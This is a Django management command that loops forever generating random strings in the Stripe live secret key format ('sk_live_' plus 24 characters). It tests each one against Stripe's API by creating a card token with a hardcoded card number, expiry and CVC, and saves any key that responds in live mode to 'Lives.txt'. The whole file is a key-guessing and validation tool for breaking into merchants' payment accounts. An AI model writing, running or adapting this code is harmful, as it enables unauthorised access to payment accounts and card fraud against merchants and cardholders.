from django.core.management.base import BaseCommand, CommandError
import stripe,random,string,colorama
from django.conf import settings
from django.core.mail import EmailMessage

class Command(BaseCommand):
    help = 'Sq'


    colorama.init()

    def handle(self, *args, **options):
        def generator():
            many = 1000
            count = 0
            def id_generator(size=24, chars=string.ascii_letters + string.digits):
                axel = ''.join(random.choice(chars) for _ in range(size))
                laast = 'sk_live_' + axel
                return laast
            f = open('Sk_Generated.txt','w')

            for i in range(int(many)):
                count += 1
                keys = id_generator()
                f.write(f'{keys}\n')


        def checker():
            where = open('Sk_Generated.txt').readlines()
            for line in where:
                line = line.replace('\n','')
                stripe.api_key = line
                try:
                    bawandar = stripe.Token.create(
                    card={
                     "number": "4270960002013126",
                     "exp_month": 3,
                     "exp_year": 2023,
                     "cvc": "948",
                   },
                 )
                    chm = str(bawandar).split('"livemode":')[1]
                    chm = chm.split(',\n')[0]
                    if "true" in chm:
                        w = open('Lives.txt','a').write(f'{line}\n')

                except:
                    continue


        num = 1
        while True:
            generator()
            checker()
            yu = open('lines.txt','w').write(str(num*1000)+'\n')
            num +=1

